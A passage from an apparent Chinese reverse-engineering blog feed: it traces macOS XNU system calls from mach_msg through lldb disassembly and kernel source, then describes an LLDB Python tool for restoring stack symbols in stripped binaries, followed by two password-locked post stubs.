libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/xia0LLDB/xia0LLDB/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
  </entry>
  
  <entry>
    <title>unicorn</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/09/13/unicorn/unicorn/</id>
    <published>2018-09-13T06:39:03.000Z</published>
    <updated>2019-04-16T03:03:09.532Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="unicorn" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/unicorn/"/>
    
  </entry>
  
  <entry>
    <title>reversing-dot-kr</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/04/29/reversing-dot-kr/reversing-dot-kr/</id>
    <published>2018-04-29T03:47:09.000Z</published>
    <updated>2019-04-29T11:47:36.495Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="way" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/way/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
</feed>
